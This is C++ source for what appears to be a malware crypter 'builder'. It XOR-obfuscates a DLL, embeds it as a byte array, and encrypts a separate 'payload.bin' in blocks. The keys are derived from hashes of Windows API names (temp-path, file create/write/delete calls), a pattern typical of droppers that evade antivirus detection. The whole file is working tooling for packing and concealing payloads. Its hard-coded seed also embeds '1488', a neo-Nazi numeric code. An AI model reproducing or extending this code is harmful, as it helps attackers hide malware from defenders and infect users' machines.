#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <iomanip>
#include <string>
#include <cstdint>
#include <cstring>
#include <algorithm>

// Подключаем ваш обновленный заголовочный файл
#include "KCLUser.h"

size_t key_struct[5];

KCLRSK rawKey = { 0 };
KCLSK secKey = { 0 };

#pragma pack(push, 1)
struct BlockData {
    uint64_t addr;
    uint64_t size;
};
#pragma pack(pop)

size_t genKey() {
    size_t res = 0;
    for (short i = 0; i < 5; i++) {
        size_t key = key_struct[i];
        res ^= key;
        key = ~key;
        key += res;
        key = _rotl64(key, 3);
        key_struct[i] = key;
    }
    return res;
}

int ExtractBlocks(const std::vector<UCHAR>& fileData, uint64_t magic) {
    UCHAR magicBytes[8];
    std::memcpy(magicBytes, &magic, 8);

    auto it = std::search(fileData.begin(), fileData.end(), std::begin(magicBytes), std::end(magicBytes));
    if (it == fileData.end()) {
        std::cerr << "Magic not found!" << std::endl;
        return 1;
    }

    size_t magic_offset = std::distance(fileData.begin(), it);
    std::cout << "Magic offset: 0x" << std::hex << magic_offset << std::endl;

    if (magic_offset + 64 > fileData.size()) {
        std::cerr << "Too small!" << std::endl;
        return 1;
    }

    uint64_t last_block_offset_val = 0;
    size_t blocks_end_pos = magic_offset + 8 + (3 * 16);
    std::memcpy(&last_block_offset_val, fileData.data() + blocks_end_pos, 8);

    size_t current_offset = magic_offset + 8;
    int blocks_read = 0;

    while (true) {
        if (current_offset + 16 > fileData.size()) {
            std::cerr << "EOF!" << std::endl;
            break;
        }

        BlockData block;
        std::memcpy(&block, fileData.data() + current_offset, 16);
        blocks_read++;

        std::cout << "Block " << std::dec << blocks_read
            << " | Addr: 0x" << std::hex << block.addr
            << " | Size: 0x" << block.size << std::endl;

        if (!KCLFillRawSecKey(&rawKey, genKey())) return 1;
        if (!KCLGetSecKey(&rawKey, &secKey)) return 1;

        if (!KCLCryptUA((LPUSTR)(fileData.data() + block.addr), block.size, &secKey, (LPUSTR)(fileData.data() + block.addr))) {
            std::cerr << "Encryption error!" << std::endl;
        }

        if (current_offset >= last_block_offset_val) {
            std::cout << "Last block." << std::endl;
            break;
        }

        current_offset += 16;

        if (blocks_read == 3) {
            current_offset += 8;
        }
    }
    return 0;
}

std::vector<UCHAR> ReadBinaryFile(const std::string& filepath) {
    std::ifstream file(filepath, std::ios::binary);
    if (!file.is_open()) return {};
    return std::vector<UCHAR>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
}

bool WriteBinaryFile(const std::string& filepath, const std::vector<UCHAR>& data) {
    std::ofstream file(filepath, std::ios::binary);
    if (!file.is_open()) return false;
    file.write(reinterpret_cast<const char*>(data.data()), data.size());
    return true;
}

void DumpRawKey(const KCLRSK& rsk, const std::string& filepath) {
    std::ofstream out(filepath);
    out << std::hex << std::uppercase << std::setfill('0');
    out << "--- KCL Raw Security Key (KCLRSK) ---\n";
    out << "a: 0x" << std::setw(16) << rsk.a << "\n";
    out << "b: 0x" << std::setw(16) << rsk.b << "\n";
    out << "c: 0x" << std::setw(16) << rsk.c << "\n";
    out << "d: 0x" << std::setw(16) << rsk.d << "\n";
    out << "e: 0x" << std::setw(2) << (int)rsk.e << "\n";
    out << "f: 0x" << std::setw(2) << (int)rsk.f << "\n";
    out << "g: 0x" << std::setw(2) << (int)rsk.g << "\n";
    out << "h: 0x" << std::setw(2) << (int)rsk.h << "\n";
    out << "x: 0x" << std::setw(8) << rsk.x << "\n";
    out << "y: 0x" << std::setw(8) << rsk.y << "\n";
    out << "z: 0x" << std::setw(8) << rsk.z << "\n";
}

void DumpSecKey(const KCLSK& sk, const std::string& filepath) {
    std::ofstream out(filepath);
    out << std::hex << std::uppercase << std::setfill('0');
    out << "--- KCL Security Key (KCLSK) ---\n\n";

    auto printArray = [&](const std::string& name, const UCHAR* arr, size_t size) {
        out << "UCHAR " << name << "[" << std::dec << size << std::hex << "] = {\n    ";
        for (size_t i = 0; i < size; i++) {
            out << "0x" << std::setw(2) << (int)arr[i];
            if (i != size - 1) out << ", ";
            if ((i + 1) % 16 == 0 && i != size - 1) out << "\n    ";
        }
        out << "\n};\n\n";
        };

    printArray("a", sk.a, 16);
    out << "UCHAR b = 0x" << std::setw(2) << (int)sk.b << ";\n\n";
    printArray("c", sk.c, 64);
    printArray("d", sk.d, 64);
    printArray("e", sk.e, 128);
}

void IndependentCrypt(std::vector<UCHAR>& data, UCHAR key) {
    for (size_t i = 0; i < data.size(); i++) {
        data[i] ^= key;
        data[i] = (data[i] << 3) | (data[i] >> 5);
        data[i] += (UCHAR)i;
    }
}

bool DumpToCArray(const std::vector<UCHAR>& data, const std::string& varName, const std::string& filepath) {
    std::ofstream out(filepath);
    if (!out.is_open()) return false;

    out << "#include <vector>\n\n";
    out << "// Size: " << data.size() << " байт\n";
    out << "std::vector<unsigned char> " << varName << " = {\n    ";

    out << std::hex << std::uppercase << std::setfill('0');
    for (size_t i = 0; i < data.size(); i++) {
        out << "0x" << std::setw(2) << (int)data[i];
        if (i != data.size() - 1) out << ", ";
        if ((i + 1) % 16 == 0 && i != data.size() - 1) out << "\n    ";
    }
    out << "\n};\n";
    return true;
}

static constexpr DWORD KCLHashStringDJB2(const char* str) {
    DWORD hash = 5381;
    while (*str) {
        hash = ((hash << 5) + hash) + *str++;
    }
    return hash;
}

constexpr DWORD hashGetTempPathA = KCLHashStringDJB2("GetTempPathA");
constexpr DWORD hashCreateFileA = KCLHashStringDJB2("CreateFileA");
constexpr DWORD hashWriteFile = KCLHashStringDJB2("WriteFile");
constexpr DWORD hashDeleteFileA = KCLHashStringDJB2("DeleteFileA");

int main() {
    std::cout << "--- BUILDER ---\n\n";

    std::cout << "[*] Phase 1: Encrypting KrnlCryptoLib.dll...\n";
    std::string dllFile = "KrnlCryptoLib.dll";
    std::vector<UCHAR> dllData = ReadBinaryFile(dllFile);

    if (dllData.empty()) {
        std::cout << "[!] Failed to read " << dllFile << "\n";
        return 1;
    }

    IndependentCrypt(dllData, 0x70);
    std::string encDllFile = "keypreset.bin";

    if (WriteBinaryFile(encDllFile, dllData)) {
        std::cout << "[+] Saved encrypted DLL to: " << encDllFile << "\n\n";
    }
    else {
        std::cout << "[!] Failed to write encrypted DLL.\n";
        return 1;
    }

    std::string arrayFile = "KCLArray.cpp";
    if (DumpToCArray(dllData, "DLLPayload", arrayFile)) {
        std::cout << "[+] Saved C++ array to: " << arrayFile << "\n";
    }
    else {
        std::cout << "[!] Failed to write C++ array.\n";
    }

    std::cout << "[*] Phase 2: Processing Target Payload...\n";

    HMODULE hLib = LoadLibraryA(dllFile.c_str());
    if (!hLib) {
        std::cout << "[!] Failed to load " << dllFile << " into memory for VEH processing.\n";
        return 1;
    }

    std::string targetFile = "payload.bin";
    std::vector<UCHAR> targetData = ReadBinaryFile(targetFile);
    if (targetData.empty()) {
        std::cout << "[!] Failed to read " << targetFile << "\n";
        return 1;
    }

    size_t masterSeed = 0x1488676714885252;
    key_struct[0] = masterSeed;
    key_struct[1] = (hashCreateFileA << 32) | hashGetTempPathA;
    key_struct[2] = (hashGetTempPathA << 32) | hashDeleteFileA;
    key_struct[3] = (hashDeleteFileA << 32) | hashWriteFile;
    key_struct[4] = (hashWriteFile << 32) | hashCreateFileA;

    ExtractBlocks(targetData, 0xDEADBEEFC0DEFACE);

    if (!KCLFillRawSecKey(&rawKey, masterSeed)) return 1;
    DumpRawKey(rawKey, "rawKey.txt");

    if (!KCLGetSecKey(&rawKey, &secKey)) return 1;
    DumpSecKey(secKey, "secKey.txt");

    std::cout << "[*] Encrypting " << targetFile << " via VEH...\n";
    if (!KCLCryptUA(targetData.data(), targetData.size(), &secKey, targetData.data())) {
        std::cout << "[!] Payload encryption failed.\n";
        return 1;
    }

    std::string encTargetFile = "result.bin";
    if (WriteBinaryFile(encTargetFile, targetData)) {
        std::cout << "[+] Saved payload to: " << encTargetFile << "\n\n";
    }
    else {
        std::cout << "[!] Failed to write encrypted DLL.\n";
        return 1;
    }

    std::string sarrayFile = "KCLSuccessArray.cpp";
    if (DumpToCArray(targetData, "SuccessPayload", sarrayFile)) {
        std::cout << "[+] Saved C++ array to: " << sarrayFile << "\n";
    }
    else {
        std::cout << "[!] Failed to write C++ array.\n";
    }

    std::cout << "\n[+] BUILD COMPLETE!\n";
    return 0;
}